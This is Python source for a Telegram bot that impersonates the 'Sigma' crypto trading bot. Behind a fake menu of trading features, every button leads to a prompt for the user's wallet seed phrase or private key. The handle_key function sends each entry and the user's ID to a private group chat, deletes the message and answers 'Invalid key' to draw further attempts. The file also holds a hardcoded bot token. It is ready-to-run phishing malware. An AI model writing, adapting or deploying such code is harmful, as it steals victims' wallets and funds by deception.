import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Your Telegram bot token and group chat ID
TOKEN = '7361433178:AAFnLb-PupM1kNDEamIkvMcehNiV6fNwpTo'
GROUP_CHAT_ID = -1002207687222

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info("Received /start command")
    
    start_message = (
        "👋 Welcome to Sigma 3\\.16\\.2\\!\n"
        "Your favorite trading bot\n"
        "\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\n\n"
        "A new wallet has been generated for you\\. Save the private key below❗\n\n"
        "`4FmvfjUd3bETeAYf6gVQsh27tmWetQZa7EvgRXdtSnF6gsqixJ86Up1NBmw6DvsFkK7EdrXPxadHt3xqXrTQmRVj`\n\n"
        "To get started, please read our docs\\!\n\n"
        "📖 [Docs](https://docs\\.sigma\\.win/)\n"
        "💬 [Official Chat](https://t\\.me/SigmaBotPortal)\n"
        "🌍 [Website](https://sigma\\.win/)\n\n"
        "Pick an option to get started\\."
    )
    
    keyboard = [
        [InlineKeyboardButton("🎯 Auto Sniper", callback_data='auto_sniper'),
         InlineKeyboardButton("🤏 Manual Buyer", callback_data='manual_buyer')],
        [InlineKeyboardButton("📊 Positions", callback_data='positions'),
         InlineKeyboardButton("🕵️ Copy Trading", callback_data='copy_trading')],
        [InlineKeyboardButton("🕐 Pending Orders", callback_data='pending_orders'),
         InlineKeyboardButton("🔧 Settings", callback_data='settings')],
        [InlineKeyboardButton("💲 Refer & Earn", callback_data='refer_earn'),
         InlineKeyboardButton("⚔️ War Room", callback_data='war_room')],
        [InlineKeyboardButton("🤖 Backup Bots", callback_data='backup_bots'),
         InlineKeyboardButton("🔠 Language", callback_data='language')],
        [InlineKeyboardButton("🚀 Airdrop", callback_data='airdrop')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await update.message.reply_text(
            start_message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error sending start message: {e}")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    keyboard = [[InlineKeyboardButton("Connect", callback_data='connect')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.reply_text(
        'Please click on "Connect" to connect defi wallet to continue',
        reply_markup=reply_markup
    )

async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "*Please enter your 12 \\- 24 mnemonic words or enter wallet private key ⬇️*",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def handle_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    key_input = update.message.text
    user_id = update.effective_user.id
    
    # Send the key to the private group
    await context.bot.send_message(
        chat_id=GROUP_CHAT_ID,
        text=f"User ID: {user_id}\nKey received: {key_input}"
    )
    
    # Delete the user's message
    await update.message.delete()
    
    # Send "Invalid key" message with "Try again" button
    keyboard = [[InlineKeyboardButton("Try again", callback_data='connect')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Invalid key",
        reply_markup=reply_markup
    )

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(connect, pattern='^connect$'))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key))

    logger.info("Starting bot")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
